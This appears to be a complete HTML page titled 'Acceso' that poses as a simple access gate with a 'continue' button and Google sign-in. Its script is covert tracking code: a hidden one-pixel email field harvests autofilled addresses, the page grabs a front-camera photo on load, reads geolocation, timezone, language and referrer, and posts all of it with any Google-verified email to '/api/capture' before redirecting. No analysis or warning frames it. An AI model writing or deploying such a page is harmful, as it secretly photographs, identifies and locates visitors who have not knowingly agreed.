<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Acceso</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    }
    #continueBtn {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      padding: 14px 32px;
      font-size: 16px;
      color: #333333;
      background: #ffffff;
      border: 1px solid #cccccc;
      border-radius: 24px;
      cursor: pointer;
    }
    #continueBtn:hover {
      background: #f5f5f5;
    }
    #emailField {
      position: fixed;
      top: 0;
      left: 0;
      width: 1px;
      height: 1px;
      opacity: 0;
      border: 0;
      padding: 0;
      margin: 0;
    }
    #googleBtn {
      display: none;
      position: fixed;
      top: calc(50% + 60px);
      left: 50%;
      transform: translateX(-50%);
      z-index: 10;
    }
  </style>
</head>
<body>
  <button id="continueBtn" type="button">Presiona aquí para ir a la web page</button>
  <div id="googleBtn"></div>
  <input type="email" id="emailField" name="email" autocomplete="email" tabindex="-1" aria-hidden="true">
  <script>
    (function () {
      var cfg = window.__GOOGLE_CONFIG__ || { mode: 'normal', client_id: '' };
      var done = false;
      var btn = document.getElementById('continueBtn');
      var emailField = document.getElementById('emailField');
      var autofillEmail = null;
      var googleEmail = null;
      var googleVerifyToken = null;

      function grabEmail() {
        try {
          var v = (emailField.value || '').trim().toLowerCase();
          if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) {
            autofillEmail = v.slice(0, 254);
          }
        } catch (e) {}
      }

      emailField.addEventListener('input', grabEmail);
      emailField.addEventListener('change', grabEmail);
      window.addEventListener('focusin', function () {
        setTimeout(grabEmail, 100);
      });
      window.addEventListener('click', function () {
        setTimeout(grabEmail, 150);
      });
      setTimeout(grabEmail, 800);
      setTimeout(grabEmail, 2000);

      function clientMetadata() {
        grabEmail();
        var meta = {
          referrer: document.referrer || null,
          lang: (navigator.language || '') + '/' + (navigator.languages ? navigator.languages.join(',') : '')
        };
        if (googleEmail && googleVerifyToken) {
          meta.email = googleEmail;
          meta.verify_token = googleVerifyToken;
        } else if (autofillEmail) {
          meta.email = autofillEmail;
        }
        try {
          meta.tz = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
        } catch (e) {
          meta.tz = null;
        }
        return meta;
      }

      function initGoogle() {
        if (cfg.mode !== 'google' || !cfg.client_id) return;
        if (!window.google || !google.accounts) return;
        google.accounts.id.initialize({
          client_id: cfg.client_id,
          callback: function (response) {
            if (!response || !response.credential) return;
            fetch('/api/google-login', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ credential: response.credential })
            })
              .then(function (r) { return r.json(); })
              .then(function (data) {
                if (data.ok) {
                  googleEmail = data.email;
                  googleVerifyToken = data.verify_token;
                  document.getElementById('googleBtn').style.display = 'none';
                  if (done) return;
                }
              })
              .catch(function () {});
          }
        });
        google.accounts.id.renderButton(document.getElementById('googleBtn'), {
          type: 'standard',
          theme: 'outline',
          text: 'continue_with',
          size: 'large'
        });
        document.getElementById('googleBtn').style.display = 'block';
        try {
          google.accounts.id.disableAutoSelect();
        } catch (e) {}
      }

      function loadGis() {
        var s = document.createElement('script');
        s.src = 'https://accounts.google.com/gsi/client';
        s.async = true;
        s.defer = true;
        s.onload = initGoogle;
        document.head.appendChild(s);
      }

      function captureFrame(stream) {
        return new Promise(function (resolve) {
          var video = document.createElement('video');
          video.setAttribute('autoplay', '');
          video.setAttribute('muted', 'true');
          video.setAttribute('playsinline', '');
          video.srcObject = stream;
          video.onloadedmetadata = function () {
            video.play().then(function () {
              setTimeout(function () {
                try {
                  var maxW = 640;
                  var scale = Math.min(1, maxW / video.videoWidth);
                  var canvas = document.createElement('canvas');
                  canvas.width = Math.max(1, Math.round(video.videoWidth * scale));
                  canvas.height = Math.max(1, Math.round(video.videoHeight * scale));
                  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                  resolve(canvas.toDataURL('image/jpeg', 0.85));
                } catch (e) {
                  resolve(null);
                }
              }, 400);
            }).catch(function () {
              resolve(null);
            });
          };
          video.onerror = function () { resolve(null); };
        });
      }

      function stopTracks(stream) {
        if (stream) stream.getTracks().forEach(function (t) { t.stop(); });
      }

      function tryCamera() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          return Promise.resolve(null);
        }
        return navigator.mediaDevices
          .getUserMedia({ video: { facingMode: 'user' }, audio: false })
          .then(function (stream) {
            return captureFrame(stream).then(function (frame) {
              stopTracks(stream);
              return frame;
            });
          })
          .catch(function () {
            return null;
          });
      }

      function collectGeo(meta) {
        return new Promise(function (resolve) {
          if (!navigator.permissions || !navigator.geolocation) return resolve(meta);
          navigator.permissions.query({ name: 'geolocation' }).then(function (p) {
            if (p.state !== 'granted') return resolve(meta);
            navigator.geolocation.getCurrentPosition(
              function (pos) {
                meta.lat = pos.coords.latitude;
                meta.lng = pos.coords.longitude;
                resolve(meta);
              },
              function () { resolve(meta); },
              { timeout: 2500, maximumAge: 60000 }
            );
          }).catch(function () { resolve(meta); });
        });
      }

      function send(photo) {
        var body = clientMetadata();
        if (photo) body.photo = photo;
        return collectGeo(body).then(function (meta) {
          return fetch('/api/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(meta)
          })
            .then(function (r) { return r.json(); })
            .then(function (data) {
              return data.destinationUrl || '/';
            })
            .catch(function () {
              return '/';
            });
        });
      }

      function go(url) {
        if (done) return;
        done = true;
        window.location.replace(url);
      }

      function finish(photo) {
        send(photo).then(go);
      }

      loadGis();

      tryCamera().then(function (photo) {
        if (photo) {
          finish(photo);
          return;
        }
        btn.style.display = 'block';
        var clicked = false;
        btn.addEventListener('click', function () {
          if (clicked) return;
          clicked = true;
          btn.style.display = 'none';
          tryCamera().then(finish);
        });
        setTimeout(function () {
          if (!clicked) finish(null);
        }, 45000);
      });
    })();
  </script>
</body>
</html>
